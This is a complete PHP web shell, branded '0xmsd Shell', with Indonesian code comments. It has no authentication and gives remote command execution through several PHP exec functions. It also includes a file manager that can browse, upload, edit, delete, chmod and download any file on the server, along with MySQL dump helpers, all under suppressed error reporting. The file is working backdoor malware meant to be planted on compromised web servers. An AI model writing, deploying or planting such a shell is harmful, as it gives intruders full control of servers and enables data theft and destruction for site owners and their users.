<?php
error_reporting(0);

// Konfigurasi sederhana
$config = array(
    'username' => '0xmsd',
    'safe_mode' => '0',
    'show_icons' => '1'
);

// ============================================
// FUNGSI COMMAND EXECUTION
// ============================================

function runCommand($cmd) {
    $functions = ['exec', 'system', 'shell_exec', 'passthru', 'proc_open'];
    $output = '';
    
    foreach($functions as $func) {
        if(function_exists($func)) {
            if($func == 'exec') {
                exec($cmd . " 2>&1", $output_arr);
                $output = implode("\n", $output_arr);
            } elseif($func == 'system' || $func == 'passthru') {
                ob_start();
                $func($cmd . " 2>&1");
                $output = ob_get_clean();
            } elseif($func == 'shell_exec') {
                $output = $func($cmd . " 2>&1");
            } elseif($func == 'proc_open') {
                $descriptors = [
                    0 => ['pipe', 'r'],
                    1 => ['pipe', 'w'],
                    2 => ['pipe', 'w']
                ];
                $process = proc_open($cmd, $descriptors, $pipes);
                if(is_resource($process)) {
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[0]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($process);
                }
            }
            if(!empty($output)) break;
        }
    }
    return !empty($output) ? $output : "Command execution disabled";
}

// ============================================
// FUNGSI FILE MANAGER
// ============================================

function listDirectory($dir) {
    if(!is_dir($dir)) return [];
    $items = scandir($dir);
    $result = [];
    foreach($items as $item) {
        if($item != '.' && $item != '..') {
            $path = $dir . '/' . $item;
            $result[] = [
                'name' => $item,
                'type' => is_dir($path) ? 'dir' : 'file',
                'size' => is_file($path) ? filesize($path) : 0,
                'perm' => substr(sprintf('%o', fileperms($path)), -4),
                'modify' => date('Y-m-d H:i:s', filemtime($path))
            ];
        }
    }
    return $result;
}

function uploadFile($target, $file) {
    return move_uploaded_file($file['tmp_name'], $target . '/' . $file['name']);
}

function deleteFile($path) {
    if(is_file($path)) return unlink($path);
    if(is_dir($path)) return rmdir($path);
    return false;
}

function createDirectory($path) {
    return mkdir($path);
}

function readFileContent($path) {
    return file_exists($path) ? file_get_contents($path) : false;
}

function writeFileContent($path, $content) {
    return file_put_contents($path, $content) !== false;
}

function changePermissions($path, $perm) {
    return chmod($path, octdec($perm));
}

function downloadFile($path) {
    if(file_exists($path)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Content-Length: ' . filesize($path));
        readfile($path);
        exit;
    }
}

// ============================================
// FUNGSI SQL/DATABASE
// ============================================

function sqlConnect($host, $user, $pass, $db) {
    return @mysqli_connect($host, $user, $pass, $db);
}

function sqlQuery($conn, $query) {
    return @mysqli_query($conn, $query);
}

function sqlFetch($result) {
    return @mysqli_fetch_assoc($result);
}

function sqlListTables($conn) {
    $result = sqlQuery($conn, "SHOW TABLES");
    $tables = [];
    if($result) {
        while($row = sqlFetch($result)) {
            $tables[] = reset($row);
        }
    }
    return $tables;
}

function sqlDump($conn, $dbname, $output) {
    $tables = sqlListTables($conn);
    $dump = "-- Database: $dbname\n-- Dump: " . date('Y-m-d H:i:s') . "\n\n";
    
    foreach($tables as $table) {
        $result = sqlQuery($conn, "SHOW CREATE TABLE $table");
        $row = sqlFetch($result);
        $dump .= "DROP TABLE IF EXISTS $table;\n";
        $dump .= $row['Create Table'] . ";\n\n";
        
        $rows = sqlQuery($conn, "SELECT * FROM $table");
        while($row = sqlFetch($rows)) {
            $values = array_map(function($v) { return "'" . addslashes($v) . "'"; }, $row);
            $dump .= "INSERT INTO $table VALUES (" . implode(',', $values) . ");\n";
        }
        $dump .= "\n";
    }
    return file_put_contents($output, $dump);
}

// ============================================
// FUNGSI UTILITY
// ============================================

function formatSize($bytes) {
    if($bytes >= 1073741824) return round($bytes/1073741824, 2) . ' GB';
    if($bytes >= 1048576) return round($bytes/1048576, 2) . ' MB';
    if($bytes >= 1024) return round($bytes/1024, 2) . ' KB';
    return $bytes . ' B';
}

function getSystemInfo() {
    return [
        'os' => PHP_OS,
        'php' => PHP_VERSION,
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'cwd' => getcwd(),
        'user' => function_exists('get_current_user') ? get_current_user() : 'Unknown',
        'safe_mode' => ini_get('safe_mode') ? 'ON' : 'OFF'
    ];
}

// ============================================
// MAIN INTERFACE
// ============================================

$current_dir = isset($_POST['dir']) ? $_POST['dir'] : getcwd();
chdir($current_dir);
$current_dir = getcwd();

// Handle actions
$action_result = '';
if(isset($_POST['action'])) {
    switch($_POST['action']) {
        case 'upload':
            if(isset($_FILES['file'])) {
                $action_result = uploadFile($current_dir, $_FILES['file']) ? '✓ File uploaded!' : '✗ Upload failed!';
            }
            break;
        case 'mkdir':
            if(isset($_POST['name'])) {
                $action_result = createDirectory($current_dir . '/' . $_POST['name']) ? '✓ Directory created!' : '✗ Create failed!';
            }
            break;
        case 'delete':
            if(isset($_POST['target'])) {
                $action_result = deleteFile($current_dir . '/' . $_POST['target']) ? '✓ Deleted!' : '✗ Delete failed!';
            }
            break;
        case 'chmod':
            if(isset($_POST['target']) && isset($_POST['perm'])) {
                $action_result = changePermissions($current_dir . '/' . $_POST['target'], $_POST['perm']) ? '✓ Permissions changed!' : '✗ Change failed!';
            }
            break;
        case 'save':
            if(isset($_POST['file']) && isset($_POST['content'])) {
                $action_result = writeFileContent($current_dir . '/' . $_POST['file'], $_POST['content']) ? '✓ File saved!' : '✗ Save failed!';
            }
            break;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>0xmsd Shell</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            font-family: 'Segoe UI', 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
            color: #fff;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            animation: fadeIn 0.5s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header {
            background: linear-gradient(135deg, rgba(15, 12, 41, 0.95), rgba(48, 43, 99, 0.95));
            backdrop-filter: blur(10px);
            padding: 20px 25px;
            border-radius: 15px;
            margin-bottom: 20px;
            border-left: 5px solid #00ff9d;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s;
        }
        
        .header:hover {
            transform: translateY(-2px);
        }
        
        .header h1 {
            background: linear-gradient(135deg, #00ff9d, #00b8ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 28px;
            font-weight: bold;
            letter-spacing: 1px;
        }
        
        .header .info {
            color: rgba(255, 255, 255, 0.7);
            font-size: 12px;
            margin-top: 10px;
            font-family: monospace;
        }
        
        .cmd-box {
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.6), rgba(20, 20, 40, 0.6));
            backdrop-filter: blur(10px);
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 20px;
            border: 1px solid rgba(0, 255, 157, 0.3);
            transition: all 0.3s;
        }
        
        .cmd-box:hover {
            border-color: rgba(0, 255, 157, 0.6);
            box-shadow: 0 0 20px rgba(0, 255, 157, 0.1);
        }
        
        .cmd-box input[type="text"] {
            width: 85%;
            padding: 12px 15px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 255, 157, 0.5);
            color: #00ff9d;
            font-family: monospace;
            border-radius: 10px;
            transition: all 0.3s;
            font-size: 14px;
        }
        
        .cmd-box input[type="text"]:focus {
            outline: none;
            border-color: #00ff9d;
            box-shadow: 0 0 15px rgba(0, 255, 157, 0.3);
        }
        
        .cmd-box input[type="submit"] {
            width: 13%;
            padding: 12px;
            background: linear-gradient(135deg, #00ff9d, #00b8ff);
            border: none;
            color: #000;
            cursor: pointer;
            font-weight: bold;
            border-radius: 10px;
            transition: all 0.3s;
            font-size: 14px;
        }
        
        .cmd-box input[type="submit"]:hover {
            transform: scale(1.02);
            box-shadow: 0 5px 20px rgba(0, 255, 157, 0.4);
        }
        
        .output {
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.7), rgba(10, 10, 30, 0.7));
            backdrop-filter: blur(10px);
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 20px;
            overflow-x: auto;
            border: 1px solid rgba(0, 255, 157, 0.3);
            font-family: monospace;
            font-size: 13px;
        }
        
        .file-manager {
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.5), rgba(20, 20, 40, 0.5));
            backdrop-filter: blur(10px);
            border-radius: 15px;
            overflow: hidden;
            border: 1px solid rgba(0, 255, 157, 0.2);
        }
        
        .toolbar {
            padding: 20px;
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.6), rgba(30, 30, 50, 0.6));
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            border-bottom: 1px solid rgba(0, 255, 157, 0.2);
        }
        
        .toolbar form {
            display: inline;
        }
        
        .toolbar input, .toolbar button {
            padding: 8px 15px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 255, 157, 0.5);
            color: #00ff9d;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: monospace;
        }
        
        .toolbar input:hover, .toolbar button:hover {
            background: rgba(0, 255, 157, 0.2);
            border-color: #00ff9d;
            transform: translateY(-1px);
        }
        
        .file-list {
            width: 100%;
            border-collapse: collapse;
        }
        
        .file-list th, .file-list td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid rgba(0, 255, 157, 0.1);
        }
        
        .file-list th {
            background: linear-gradient(135deg, rgba(0, 255, 157, 0.1), rgba(0, 184, 255, 0.1));
            color: #00ff9d;
            font-weight: bold;
        }
        
        .file-list tr {
            transition: all 0.3s;
        }
        
        .file-list tr:hover {
            background: rgba(0, 255, 157, 0.1);
            transform: translateX(5px);
        }
        
        .file-list .dir a {
            color: #ffd966;
            text-decoration: none;
            font-weight: bold;
        }
        
        .file-list .file a {
            color: #00ff9d;
            text-decoration: none;
        }
        
        .file-list .dir a:hover, .file-list .file a:hover {
            text-shadow: 0 0 8px currentColor;
        }
        
        .actions a {
            color: #00ff9d;
            text-decoration: none;
            margin: 0 5px;
            padding: 3px 8px;
            border-radius: 5px;
            transition: all 0.3s;
            font-size: 12px;
        }
        
        .actions a:hover {
            background: rgba(0, 255, 157, 0.2);
            text-shadow: 0 0 5px #00ff9d;
        }
        
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(15px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            animation: fadeIn 0.3s;
        }
        
        .modal-content {
            background: linear-gradient(135deg, #0f0c29, #1a1538);
            padding: 25px;
            border-radius: 20px;
            width: 85%;
            max-width: 900px;
            border: 1px solid rgba(0, 255, 157, 0.5);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.3s;
        }
        
        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .modal-content textarea {
            width: 100%;
            height: 450px;
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(0, 255, 157, 0.5);
            color: #00ff9d;
            font-family: monospace;
            padding: 15px;
            border-radius: 12px;
            font-size: 13px;
            line-height: 1.5;
        }
        
        .modal-content textarea:focus {
            outline: none;
            border-color: #00ff9d;
            box-shadow: 0 0 15px rgba(0, 255, 157, 0.2);
        }
        
        .close {
            float: right;
            cursor: pointer;
            color: #ff6b6b;
            font-size: 28px;
            font-weight: bold;
            transition: all 0.3s;
            line-height: 1;
        }
        
        .close:hover {
            color: #ff4444;
            transform: rotate(90deg);
        }
        
        .success {
            background: linear-gradient(135deg, rgba(0, 255, 157, 0.2), rgba(0, 200, 120, 0.2));
            border-left: 4px solid #00ff9d;
            padding: 12px 18px;
            border-radius: 10px;
            margin-bottom: 15px;
            color: #00ff9d;
            font-weight: bold;
            animation: slideIn 0.3s;
        }
        
        .error {
            background: linear-gradient(135deg, rgba(255, 100, 100, 0.2), rgba(200, 50, 50, 0.2));
            border-left: 4px solid #ff6b6b;
            padding: 12px 18px;
            border-radius: 10px;
            margin-bottom: 15px;
            color: #ff6b6b;
            font-weight: bold;
            animation: slideIn 0.3s;
        }
        
        @keyframes slideIn {
            from { transform: translateX(-20px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
            color: #b0ffb0;
            font-family: monospace;
        }
        
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, #00ff9d, #00b8ff);
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(135deg, #00ffb3, #00ccff);
        }
        
        button, input[type="submit"] {
            cursor: pointer;
        }
        
        @media (max-width: 768px) {
            body { padding: 10px; }
            .cmd-box input[type="text"] { width: 100%; margin-bottom: 10px; }
            .cmd-box input[type="submit"] { width: 100%; }
            .toolbar form { width: 100%; }
            .toolbar input, .toolbar button { width: 100%; }
            .file-list { font-size: 12px; }
            .file-list th, .file-list td { padding: 8px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>⚡ 0xmsd Shell ⚡</h1>
        <div class="info">
            <?php $info = getSystemInfo(); ?>
            💻 OS: <?php echo $info['os']; ?> | 🐘 PHP: <?php echo $info['php']; ?> | 
            🌐 Server: <?php echo $info['server']; ?> | 👤 User: <?php echo $info['user']; ?>
        </div>
    </div>
    
    <!-- Command Executor -->
    <div class="cmd-box">
        <form method="post">
            <input type="text" name="cmd" placeholder="$ enter command..." autocomplete="off">
            <input type="submit" name="execute" value="▶ RUN">
        </form>
    </div>
    
    <?php if(isset($_POST['execute']) && isset($_POST['cmd'])): ?>
        <div class="output">
            <pre><?php echo htmlspecialchars(runCommand($_POST['cmd'])); ?></pre>
        </div>
    <?php endif; ?>
    
    <?php if($action_result): ?>
        <div class="<?php echo strpos($action_result, '✗') !== false ? 'error' : 'success'; ?>">
            <?php echo $action_result; ?>
        </div>
    <?php endif; ?>
    
    <!-- File Manager -->
    <div class="file-manager">
        <div class="toolbar">
            <form method="post" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <input type="hidden" name="dir" value="<?php echo $current_dir; ?>">
                <input type="file" name="file" style="display:inline-block; width:auto;">
                <input type="submit" value="📤 Upload">
            </form>
            <form method="post">
                <input type="hidden" name="action" value="mkdir">
                <input type="hidden" name="dir" value="<?php echo $current_dir; ?>">
                <input type="text" name="name" placeholder="folder name" size="15">
                <input type="submit" value="📁 New Folder">
            </form>
            <form method="post">
                <input type="text" name="dir" value="<?php echo $current_dir; ?>" size="40">
                <input type="submit" value="🔄 Go">
            </form>
        </div>
        
        <table class="file-list">
            <thead>
                 <tr>
                    <th>📄 Name</th>
                    <th>💾 Size</th>
                    <th>🔐 Perm</th>
                    <th>📅 Modified</th>
                    <th>⚡ Actions</th>
                  </tr>
            </thead>
            <tbody>
                <?php if($current_dir != '/' && $current_dir != getcwd()): ?>
                <tr>
                    <td class="dir">📁 <a href="#" onclick="changeDir('<?php echo dirname($current_dir); ?>')">..</a></td>
                    <td>-</td>
                    <td>-</td>
                    <td>-</td>
                    <td>-</td>
                </tr>
                <?php endif; ?>
                
                <?php foreach(listDirectory($current_dir) as $item): ?>
                <tr>
                    <td class="<?php echo $item['type']; ?>">
                        <?php if($item['type'] == 'dir'): ?>
                            📁 <a href="#" onclick="changeDir('<?php echo $current_dir . '/' . $item['name']; ?>')"><?php echo htmlspecialchars($item['name']); ?></a>
                        <?php else: ?>
                            📄 <?php echo htmlspecialchars($item['name']); ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $item['type'] == 'file' ? formatSize($item['size']) : '-'; ?></td>
                    <td><?php echo $item['perm']; ?></td>
                    <td><?php echo $item['modify']; ?></td>
                    <td class="actions">
                        <?php if($item['type'] == 'file'): ?>
                            <a href="#" onclick="viewFile('<?php echo $item['name']; ?>')">👁 View</a>
                            <a href="#" onclick="editFile('<?php echo $item['name']; ?>')">✏ Edit</a>
                            <a href="#" onclick="downloadFile('<?php echo $item['name']; ?>')">⬇ Dl</a>
                        <?php endif; ?>
                        <a href="#" onclick="chmodFile('<?php echo $item['name']; ?>')">🔑 Chmod</a>
                        <a href="#" onclick="deleteFile('<?php echo $item['name']; ?>')" style="color:#ff6b6b">🗑 Del</a>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<!-- Modal untuk View/Edit -->
<div id="modal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal()">&times;</span>
        <h3 id="modal-title" style="color:#00ff9d; margin-bottom:15px;"></h3>
        <form method="post" id="modal-form">
            <input type="hidden" name="action" id="modal-action">
            <input type="hidden" name="file" id="modal-file">
            <input type="hidden" name="dir" value="<?php echo $current_dir; ?>">
            <textarea id="modal-content" name="content" rows="20"></textarea>
            <br><br>
            <input type="submit" value="💾 Save" style="background:linear-gradient(135deg,#00ff9d,#00b8ff); border:none; padding:10px 25px; border-radius:8px; cursor:pointer; font-weight:bold;">
        </form>
    </div>
</div>

<script>
function changeDir(path) {
    var form = document.createElement('form');
    form.method = 'post';
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'dir';
    input.value = path;
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
}

function viewFile(name) {
    document.getElementById('modal-title').innerHTML = '👁 View: ' + name;
    document.getElementById('modal-action').value = '';
    document.getElementById('modal-file').value = name;
    document.getElementById('modal-content').readOnly = true;
    document.getElementById('modal-content').value = 'Loading...';
    document.getElementById('modal').style.display = 'flex';
    
    fetch('?view=' + encodeURIComponent(name))
        .then(r => r.text())
        .then(t => document.getElementById('modal-content').value = t);
}

function editFile(name) {
    document.getElementById('modal-title').innerHTML = '✏ Edit: ' + name;
    document.getElementById('modal-action').value = 'save';
    document.getElementById('modal-file').value = name;
    document.getElementById('modal-content').readOnly = false;
    document.getElementById('modal').style.display = 'flex';
    
    fetch('?view=' + encodeURIComponent(name))
        .then(r => r.text())
        .then(t => document.getElementById('modal-content').value = t);
}

function downloadFile(name) {
    window.location.href = '?download=' + encodeURIComponent(name);
}

function deleteFile(name) {
    if(confirm('⚠️ Delete ' + name + '? This action cannot be undone!')) {
        var form = document.createElement('form');
        form.method = 'post';
        form.innerHTML = '<input type="hidden" name="action" value="delete">' +
                        '<input type="hidden" name="target" value="' + name + '">' +
                        '<input type="hidden" name="dir" value="<?php echo $current_dir; ?>">';
        document.body.appendChild(form);
        form.submit();
    }
}

function chmodFile(name) {
    var perm = prompt('🔐 Enter permission (e.g., 755, 644, 777):', '644');
    if(perm && /^[0-7]{3}$/.test(perm)) {
        var form = document.createElement('form');
        form.method = 'post';
        form.innerHTML = '<input type="hidden" name="action" value="chmod">' +
                        '<input type="hidden" name="target" value="' + name + '">' +
                        '<input type="hidden" name="perm" value="' + perm + '">' +
                        '<input type="hidden" name="dir" value="<?php echo $current_dir; ?>">';
        document.body.appendChild(form);
        form.submit();
    } else if(perm) {
        alert('Invalid permission format! Use 3 digits (e.g., 755)');
    }
}

function closeModal() {
    document.getElementById('modal').style.display = 'none';
}

document.addEventListener('keydown', function(e) {
    if(e.key === 'Escape') closeModal();
});
</script>

<?php
if(isset($_GET['view'])) {
    $file = $current_dir . '/' . $_GET['view'];
    if(file_exists($file)) {
        header('Content-Type: text/plain');
        echo readFileContent($file);
    }
    exit;
}

if(isset($_GET['download'])) {
    downloadFile($current_dir . '/' . $_GET['download']);
}
?>
</body>
</html>
